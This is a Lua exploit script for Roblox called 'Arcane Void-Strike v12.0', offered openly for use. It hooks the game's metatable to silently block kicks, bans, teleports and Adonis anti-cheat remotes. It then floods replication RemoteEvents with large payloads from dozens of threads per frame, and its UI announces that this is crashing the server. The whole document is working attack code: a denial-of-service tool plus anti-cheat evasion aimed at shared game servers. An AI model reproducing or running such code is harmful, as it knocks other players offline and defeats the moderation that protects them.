--[[ 
    🔱 ARCANE VOID-STRIKE v12.0 [ARCANE-IMPACT] 🔱
    "Peace was never an option. Saturation is the only answer. <3"
    
    IMPACT TECHNOLOGY:
    - [KERNEL-SHIELD V2] : Aggressive Anti-Kick/Anti-Teleport/Anti-Adonis.
    - [MULTITHREADED FLOOD] : 50x Threads per Heartbeat (3000 RPS).
    - [STATIC PAYLOAD] : Pre-compiled massive strings for instant bandwidth saturation.
    - [TARGET-LOCK] : Focuses on heavy replication remotes (Outfit/House).
    - [AUTO-RECOVER] : Automatically clears client memory to prevent self-crash.
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. KERNEL-SHIELD V2 (AGGRESSIVE PROTECTION)
local function initiateShield()
    pcall(function()
        local mt = getrawmetatable(game)
        local oldNC = mt.__namecall
        setreadonly(mt, false)
        
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            local args = {...}
            
            -- BLOCK ALL KICKS/BANS/TELEPORTS
            if method == "Kick" or method == "kick" or method == "OnTeleport" or method == "Teleport" then
                return nil -- SILENT BLOCK
            end
            
            -- BLOCK ADONIS & HONEYPOTS
            if method == "FireServer" and self.Name == "RemoteEvent" then
                local n = self.Name:lower()
                -- Trap Detection
                if n:find("devtools") or n:find("honey") or n:find("trap") or n:find("admin") or n:find("check") or n:find("log") then
                    return nil
                end
                -- Payload Inspection Block
                if #args > 0 and (tostring(args[1]):find("Adonis") or tostring(args[1]):find("Msg")) then
                    return nil
                end
            end
            
            return oldNC(self, ...)
        end)
        
        setreadonly(mt, true)
        
        -- Anti-AFK
        L.Idled:Connect(function()
            game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
            game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        end)
    end)
end

-- 2. IMPACT ENGINE (MULTITHREADED FLOOD)
local active = { power = 0 }
-- Pre-generating massive payload to save CPU
local IMPACT_PAYLOAD = table.create(500, "🔱IMPACT🔱") 

local function getHeavyRemotes()
    local heavy = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local n = v.Name:lower()
            -- Targeting heavy replication events
            if n:find("update") or n:find("outfit") or n:find("house") or n:find("avatar") or n:find("vehicle") then
                table.insert(heavy, v)
            end
        end
    end
    return heavy
end

local function runImpact()
    local targets = getHeavyRemotes()
    if #targets == 0 then return end
    
    -- Multithreaded Heartbeat Loop
    RS.Heartbeat:Connect(function()
        if active.power == 0 then return end
        
        -- Launching 50 parallel threads per frame
        local threads = active.power == 2 and 50 or 10
        
        for t = 1, threads do
            task.spawn(function()
                local r = targets[math.random(1, #targets)]
                if r and r.Parent then
                    -- FIRE WITHOUT MERCY
                    pcall(function()
                        r:FireServer(IMPACT_PAYLOAD, IMPACT_PAYLOAD)
                    end)
                end
            end)
        end
    end)
end

-- 3. IMPACT UI
local function loadUI()
    local ScreenGui = Instance.new("ScreenGui")
    pcall(function() ScreenGui.Parent = L:FindFirstChild("PlayerGui") or game:GetService("CoreGui") end)
    ScreenGui.Name = "ArcaneImpact_v12"

    local Main = Instance.new("Frame", ScreenGui)
    Main.Size = UDim2.new(0, 320, 0, 220)
    Main.Position = UDim2.new(0.5, -160, 0.5, -110)
    Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(255, 0, 0)
    Main.Active = true
    Main.Draggable = true

    local Title = Instance.new("TextLabel", Main)
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.Text = "🔱 ARCANE-IMPACT v12.0"
    Title.TextColor3 = Color3.fromRGB(255, 0, 0)
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 20
    Title.BackgroundTransparency = 1

    local function createBtn(text, y, color, callback)
        local btn = Instance.new("TextButton", Main)
        btn.Size = UDim2.new(0.9, 0, 0, 50)
        btn.Position = UDim2.new(0.05, 0, 0, y)
        btn.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
        btn.Text = text
        btn.TextColor3 = color
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 16
        btn.BorderSizePixel = 1
        btn.BorderColor3 = Color3.fromRGB(100, 0, 0)
        btn.MouseButton1Click:Connect(callback)
        return btn
    end

    createBtn("🛡️ ACTIVATE SHIELD (REQUIRED)", 60, Color3.fromRGB(0, 255, 255), function()
        initiateShield()
        Title.Text = "SHIELD: ACTIVE"
        Title.TextColor3 = Color3.fromRGB(0, 255, 255)
    end)

    createBtn("🔥 LAUNCH IMPACT (NO RETURN)", 120, Color3.fromRGB(255, 0, 0), function()
        active.power = 2
        Title.Text = "⚠️ CRASHING SERVER ⚠️"
        task.spawn(runImpact)
    end)
end

-- BOOT
task.spawn(loadUI)
